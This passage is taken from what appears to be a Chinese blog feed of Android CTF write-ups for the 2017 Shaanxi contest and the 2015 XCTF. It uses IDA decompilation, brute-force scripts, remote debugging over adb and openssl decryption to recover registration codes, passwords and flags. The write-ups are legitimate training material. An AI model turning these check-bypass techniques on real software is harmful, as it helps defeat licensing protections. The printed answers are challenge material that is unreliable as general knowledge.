&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(GetString.encrypt(MainActivity.this.editText.getText().toString().trim())) {
    Toast.makeText(MainActivity.this, &quot;OK&quot;, 0).show();
}
else {
    Toast.makeText(MainActivity.this, &quot;Error&quot;, 0).show();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;不是很懂为什么作者要在这里定义三个函数。。。。。。仿佛是一个第一次用NDK的新手。。。。。。&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class GetString {
    static {
        System.loadLibrary(&quot;XTU&quot;);
    }

    public GetString() {
        super();
    }

    public static native boolean encrypt(GetString this, String arg1) {
    }

    public static native String getString(GetString this) {
    }

    public static native String sendData(GetString this, String arg1) {
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用IDA分析so&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E6B60BD42528676031F1C17721DFC679.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在分析完逻辑后，有两个方法可以拿到RegCode&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;写代码跑，计算逻辑都已经给了&lt;/li&gt;
  &lt;li&gt;动态调试，下个断点跟踪&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第一种方法，找到赋值的数组&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0F52E3075DB7B4E88722C8D45A5DADF6.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;简单写了个脚本跑&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# coding:utf-8

RegCode_Cal = []
Key = list(&quot;yInS567!bcNOUV8vwCDefXYZadoPQRGx13ghTpqrsHklm2EFtuJKLzMijAB094W&quot;)
dest = [0x39, 0x20, 0x07, 0x0A, 0x20, 0x29, 0x13, 0x02, 0x3A, 0xC, 0x11, 0x31, 0x3B, 0x0B, 0x07]

for i in range(len(dest)):
	RegCode_Cal.append(Key[dest[i]])

print &quot;&quot;.join(RegCode_Cal)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结果&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A1!N1HenBUCu0O!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二种方法，动态调试出结果&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\wangz\Desktop
$ adb forward tcp:23946 tcp:23946
C:\Users\wangz\Desktop
$ adb shell
root@jflte:/ # cd data/local
root@jflte:/data/local # ./as
IDA Android 32-bit remote debug server(ST) v1.19. Hex-Rays (c) 2004-2015
Listening on port #23946...

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再次使用IDA打开一个新的so文件，无任何修改，下面两个地方下断点都可以&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/23CC6F4BF30255FFE72E6A1267F4345B.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;挂上应用，断下来后，在数据窗口跟随R4就可以看到RegCode&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7C87838477E43F22EF48C3828D277119.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Mon, 01 May 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E5%8F%96%E8%AF%81%E5%AF%86%E7%A0%81-200.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E5%8F%96%E8%AF%81%E5%AF%86%E7%A0%81-200.html</guid>
            </item>
        
            <item>
                <title>2017 陕西省网络安全大赛 - 人民的名义-抓捕赵德汉2-200</title>
                <description>&lt;p&gt;先来感受下混淆&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/43DC5F0EBCE7E9A15E5D4B0AE05BA517.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不过这个混淆还是蛮一般的&lt;/p&gt;

&lt;p&gt;找到入口&lt;/p&gt;

&lt;p&gt;这个很奇怪的方法目测就是校验函数，跳过去，发现就是上面那个截图里的函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E363E7F113A8FD518C30B50C24154402.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这尼玛怎么看，使用Jar2Dex工具转为Dex文件&lt;/p&gt;

&lt;p&gt;然后就是一个个函数改啊改&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/78FF1B49A127AE6AC18F9403802DBB25.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现又是一个可以使用Console输出RegCode的题目&lt;/p&gt;

&lt;p&gt;上Eclipse&lt;/p&gt;

&lt;p&gt;把四个类全都拷贝进Demo工程，把那些乱七八糟报错的直接去掉，不影响的，为了方便，直接在入口调用校验函数，然后在校验的地方把数据输出来&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/58F94741A197562EB9943D409A36BBF3.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果校验函数没有修改条件的话，要默认输入19位字符&lt;/p&gt;

&lt;p&gt;要注意的是，每隔4位有一个随意的字符填充，这个一般默认的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;，所以我们默认填充&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0712644673D61679C801C643D1CA3823.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当然最后会多一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;，到时去掉即可&lt;/p&gt;

&lt;p&gt;运行输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sssn-trtk-tcea-akJr-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们校验一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/540582EEBE09FF3EF95688B1CB27E9F7.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有意思的是&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F0F3D6E75EAC359ADA1BB2D98DE34BCA.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;凑巧的是：我都不是。。。。。。&lt;/p&gt;
</description>
                <pubDate>Mon, 01 May 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%892-200.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%892-200.html</guid>
            </item>
        
            <item>
                <title>2017 陕西省网络安全大赛 - 取证密码-200</title>
                <description>&lt;p&gt;在翻翻翻的时候发现这题可以秒~&lt;/p&gt;

&lt;p&gt;这题是Jar包的形式，不要使用Jar2Dex工具，会丢失部分数据&lt;/p&gt;

&lt;p&gt;找到入口函数，中间有一个读入对比判断，跟入判断&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1E85BA5B8337D7D79F56C35321DDF326.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个判断函数将输入的数据做MD5计算&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3A5727F19B524FD72FF8AFDD202C2FAE.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;真的没有其它操作了。。。。。。&lt;/p&gt;

&lt;p&gt;前面看到什么读取文件，AES加密什么的，都是浮云。。。。。。&lt;/p&gt;

&lt;p&gt;将这个MD5字符串拿去解密&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/662DC67AB7D1C250A3CDB3B2A33DC500.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后验证一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\wangz\Desktop&amp;gt;java -jar exercise1.jar
Enter password:
monkey99
Well done, that is the correct password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;都是假的，都是假的，都是假的~~~&lt;/p&gt;
</description>
                <pubDate>Mon, 01 May 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%891-200.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%891-200.html</guid>
            </item>
        
            <item>
                <title>2017 陕西省网络安全大赛 - The Marauders Map-150</title>
                <description>&lt;p&gt;混淆掉了一些函数名，耐心，耐心，耐心~~~&lt;/p&gt;

&lt;p&gt;Java层的混淆手动恢复一下即可&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C33F117BCB2FA645E765F4BD0DFBB6D0.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readSec.checkRegCode()&lt;/code&gt;函数两个参数分别是输入的注册码，还有一个通过另一个类来获取，具体是操作数据库，初步判断没有密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3F0D5CE642C18349F5D44CBE63B3A727.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个值可以使用数据库查看工具来查看&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B56BEB70AC418871127004990E6CEDB0.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么接下来就是native层的计算了&lt;/p&gt;

&lt;p&gt;native层混淆掉了各种系统函数，简单修复下参数类型，如下图所示&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int __fastcall Java_com_example_icontest_ReadSe_readbin(JNIEnv *env, int a2, jstring RegCode)
{
    JNIEnv *vEnv; // ST0C_4@1
    int v4; // r0@1

    vEnv = env;
    sub_10F4((int)env, (int)RegCode);
    v4 = sub_1220();
    return sub_E04(vEnv, v4);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;逐个函数分析，首先是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_10F4()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void *__fastcall sub_10F4(JNIEnv *env, jstring RegCode)
{
    jstring vRegCode; // ST00_4@1
    int v3; // ST10_4@1
    int v4; // ST14_4@1
    int v5; // ST18_4@1
    JNIEnv *vEnv; // [sp+4h] [bp-28h]@1
    void *dest; // [sp+Ch] [bp-20h]@1
    int v9; // [sp+1Ch] [bp-10h]@1
    int n; // [sp+20h] [bp-Ch]@1
    void *src; // [sp+24h] [bp-8h]@1

    vEnv = env;
    vRegCode = RegCode;
    dest = 0;
    v3 = sub_CC4(env, (int)&quot;java/lang/String&quot;);
    v4 = sub_E04(vEnv, &quot;utf-8&quot;);
    v5 = sub_D5C(vEnv, v3, &quot;getBytes&quot;, &quot;(Ljava/lang/String;)[B&quot;);
    v9 = sub_DA8(vEnv, vRegCode, v5, v4);
    n = sub_E40(vEnv, v9);
    src = (void *)sub_EB8(vEnv, v9, 0);
    if ( n &amp;gt; 0 )
    {
        dest = malloc(n + 1);
        memcpy(dest, src, n);
        *((_BYTE *)dest + n) = 0;
    }
    sub_EFC(vEnv, v9, src, 0);
    return dest;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;依旧各种看不懂，不过最下面的if分支很眼熟，强行猜测这是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetStringUnicodeChars()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;经常分析的应该是很容易看出来，如果看不出来，再次跟进去，比如第一个&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;v3 = sub_CC4(env, (int)&quot;java/lang/String&quot;);
---&amp;gt;
int __fastcall sub_CC4(JNIEnv *a1, int a2)
{
    return (*a1)-&amp;gt;FindClass(a1, (const char *)a2);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二个&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;v4 = sub_E04(vEnv, (int)&quot;utf-8&quot;);
---&amp;gt;
int __fastcall sub_E04(JNIEnv *a1, int a2)
{
    return (*a1)-&amp;gt;NewStringUTF(a1, (const char *)a2);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;依次处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C93A712E0A5823C083CC6D3567DFCF3D.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个就可以看出来是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetStringUnicodeChars()&lt;/code&gt;函数了&lt;/p&gt;

&lt;p&gt;明显的，上层函数识别的不完整，不过没关系，我们双击下个函数进去后，上层函数自然就会修复了，就像这样，由于前面修复了部分函数的命名，所以最后返回的函数名也修复了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int __fastcall Java_com_example_icontest_ReadSe_readbin(JNIEnv *env, int a2, jstring RegCode)
{
    JNIEnv *vEnv; // ST0C_4@1
    const char *RegCode_chars; // r0@1
    char *v5; // r0@1

    vEnv = env;
    RegCode_chars = (const char *)GetStringUnicodeChars(env, RegCode);
    v5 = sub_1220(RegCode_chars);
    return NewStringUTF(vEnv, (int)v5);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从结构上来看，这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1220()&lt;/code&gt;函数应该是关键的计算函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;char *__fastcall sub_1220(const char *RegCode_chars)
{
    signed int temp; // ST18_4@2
    int j_add_1; // ST10_4@2
    const char *vRegCode_chars; // [sp+4h] [bp-28h]@1
    signed int i; // [sp+Ch] [bp-20h]@1
    int j; // [sp+10h] [bp-1Ch]@1
    signed int vRegCode_chars_len; // [sp+14h] [bp-18h]@1
    char *src; // [sp+1Ch] [bp-10h]@1

    vRegCode_chars = RegCode_chars;
    vRegCode_chars_len = strlen(RegCode_chars);
    i = 0;
    j = 0;
    src = (char *)operator new[](2 * vRegCode_chars_len + 1);
    do
    {
        temp = vRegCode_chars[i];
        src[j] = sub_1078(~(_BYTE)temp &amp;amp; 0xF);
        j_add_1 = j + 1;
        src[j_add_1] = sub_1078((temp &amp;gt;&amp;gt; 4) ^ 0xE);
        ++i;
        j = j_add_1 + 1;
    }
    while ( i &amp;lt; vRegCode_chars_len );
    src[2 * vRegCode_chars_len] = 0;
    strncpy((char *)vRegCode_chars, src, 2 * vRegCode_chars_len + 1);
    return (char *)vRegCode_chars;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;分析一圈，就中间两个计算最重要，大概的意思就是把一个字节的数据拆成前后各4位，然后再各种计算，逆着写代码太费劲，直接遍历可见字符，不管那么多了，一个字节最大0xFF，强行遍历到0xFF&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstdio&amp;gt;
#include &amp;lt;cstring&amp;gt;
using namespace std;

signed char sub_1078(signed int a1)
{
    signed int v1; // r3@3

    if ( a1 &amp;gt; 9 || a1 &amp;lt; 0 )
    {
        if ( a1 &amp;lt;= 9 || a1 &amp;gt; 15 )
            v1 = 255;
        else
            v1 = (unsigned char)(a1 + 87);
    }
    else
    {
        v1 = (unsigned char)(a1 + 48);
    }
    return v1;
}

int main()
{
    char Key[] = &quot;9838e888496bfda98afdbb98a9b9a9d9cdfa29&quot;;
    for(int i = 0; i &amp;lt; strlen(Key); i += 2)
    {
        for(unsigned char j = 0; j &amp;lt; 0xFF; j++)
        {
            if(sub_1078(~j &amp;amp; 0xF) == Key[i] &amp;amp;&amp;amp; sub_1078((j &amp;gt;&amp;gt; 4) ^ 0xE) == Key[i + 1])
                printf(&quot;%c&quot;, j);
        }
    }
    printf(&quot;\n&quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flag{Y0uG0Tfutur3@}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;刚开始发现怪怪的，因为输出的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{need your blessing}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;后来发现表搞错了。。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/693A2964E6194CAFD3E4B22BCFD55820.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;暴力大法好~~~&lt;/p&gt;
</description>
                <pubDate>Mon, 01 May 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-The-Marauders-Map-150.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-The-Marauders-Map-150.html</guid>
            </item>
        
            <item>
                <title>2015 XCTF&RCTF - where-300</title>
                <description>&lt;p&gt;2015XCTF福州站的第二道Mobile题，分值200&lt;/p&gt;

&lt;p&gt;想到第一题才100分就那么折腾，这题估计好不到哪里去&lt;/p&gt;

&lt;p&gt;使用JEB反编译，发现逻辑很是简单&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/68C71F2058340F4008D5F53AEA9E5D54.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;输入用户名和密码，长度要想等，用户名和密码的逆序串相等则输出字符串&lt;/p&gt;

&lt;p&gt;返回Flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/452D4D83DC86A86E8E38B3E46D0DC2FA.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Oops，出题的大佬良心发现故意来个简单的？？？？？？&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Too simple sometimes naive&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C2ABB0A8E5BEA26BD59A829521B000F6.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;看文件夹结构&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;│  AndroidManifest.xml
│  classes.dex
│  resources.arsc
│  
├─assets
│      abc
│      flag
│      
├─META-INF
│      CERT.RSA
│      CERT.SF
│      MANIFEST.MF
│      y
│      
└─res
......
    │      
    └─menu
            main.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;删了一些布局文件，不然长的没天理了&lt;/p&gt;

&lt;p&gt;发现有两处看起来值得注意的，一个是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assets&lt;/code&gt;文件夹，一个是签名文件夹下的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;熟悉Dex文件结构的同学应该很清楚这是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abc&lt;/code&gt;文件其实就是Dex的Dex Header，从长度来看很清楚的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x70&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3D24B7F0470AA5D22FEC7F580AFF4F2C.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;，看不出是什么，我就想：”&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;会不会是Dex后面的数据，出题人把它拆分了”，但是怎么都合不上&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1E68CFD30CA2BE3753E19AC8B41A9658.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到这里，思路真的就断了&lt;/p&gt;

&lt;p&gt;期间喝了四杯香飘飘&lt;/p&gt;

&lt;p&gt;本以为一杯草莓味的就可以有思路&lt;/p&gt;

&lt;p&gt;一杯又一杯&lt;/p&gt;

&lt;p&gt;四杯就喝完了&lt;/p&gt;

&lt;p&gt;晚上又啃了一只脆皮鸡&lt;/p&gt;

&lt;p&gt;外脆里嫩，一口咬下去还有油滋出来&lt;/p&gt;

&lt;p&gt;就在吃完的时候，想到了一个思路&lt;/p&gt;

&lt;p&gt;y会不会是加密了&lt;/p&gt;

&lt;p&gt;就这几个字节还加密？？？？？？&lt;/p&gt;

&lt;p&gt;当我看着&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;发呆的时候，突然。。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/441D5FB8F632199167D67B10FAE381C7.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;按照常理，这个应该只有1kb左右&lt;/p&gt;

&lt;p&gt;这个为什么这么大？？？？？？&lt;/p&gt;

&lt;p&gt;由于一直对前面的Dex Header念念不忘，&lt;strong&gt;抱着打死出题人也要找出Dex后面数据的决心&lt;/strong&gt;，做了一个大胆的猜测，Dex后面的数据肯定在这里！！！！！！&lt;/p&gt;

&lt;p&gt;找到1kb左右偏移的地方，左边偏移是十进制形式&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/395A5983CEB495741A7464B51EAC22ED.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;看到了关键的字眼&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KEY=Misc@inf0#fjhx11&lt;/code&gt;，这可能是在告诉我们秘钥&lt;/p&gt;

&lt;p&gt;接下来进入高潮&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DEX=&lt;/code&gt;，这个意味着后面的数据就是Dex Header以后的数据，再结合前面的KEY，说明这一片数据应该是被加密了，熟悉Dex格式的同学应该清楚Dex Header后面是String Ids，是一片很整齐的数据，而这里乱七八糟的，明显是加密了&lt;/p&gt;

&lt;p&gt;我们把它拷贝出来，就在看最后的数据长度的时候，发现另一个关键信息&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aes-128-cbc&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E653F6287A81F49D343DB4916B518B72.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这是在告诉我们加密方式&lt;/p&gt;

&lt;p&gt;接下去这一步就看个人了，搞过openssl的同学肯定记得这个，虽然到现在我也不知道到底&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;help&lt;/code&gt;是哪个命令&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@wnagzihxa1n /home/wnagzihxain]# openssl -h
openssl:Error: '-h' is an invalid command.

Standard commands
asn1parse         ca                ciphers           cms               
crl               crl2pkcs7         dgst              dh                
dhparam           dsa               dsaparam          ec                
ecparam           enc               engine            errstr            
gendh             gendsa            genpkey           genrsa            
nseq              ocsp              passwd            pkcs12            
pkcs7             pkcs8             pkey              pkeyparam         
pkeyutl           prime             rand              req               
rsa               rsautl            s_client          s_server          
s_time            sess_id           smime             speed             
spkac             srp               ts                verify            
version           x509              

Message Digest commands (see the `dgst' command for more details)
md4               md5               rmd160            sha               
sha1              

Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       base64            bf                
bf-cbc            bf-cfb            bf-ecb            bf-ofb            
camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  camellia-192-ecb  
camellia-256-cbc  camellia-256-ecb  cast              cast-cbc          
cast5-cbc         cast5-cfb         cast5-ecb         cast5-ofb         
des               des-cbc           des-cfb           des-ecb           
des-ede           des-ede-cbc       des-ede-cfb       des-ede-ofb       
des-ede3          des-ede3-cbc      des-ede3-cfb      des-ede3-ofb      
des-ofb           des3              desx              rc2               
rc2-40-cbc        rc2-64-cbc        rc2-cbc           rc2-cfb           
rc2-ecb           rc2-ofb           rc4               rc4-40            
seed              seed-cbc          seed-cfb          seed-ecb          
seed-ofb        
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aes-128-cbc&lt;/code&gt;我的第一想法就是openssl&lt;/p&gt;

&lt;p&gt;我们把最后面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aes-128-cbc&lt;/code&gt;删掉，使用openssl解密&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@wnagzihxa1n /home/wnagzihxain]# openssl aes-128-cbc -d -k &quot;Misc@inf0#fjhx11&quot; -nosalt -in encDexBody -out decDexBody
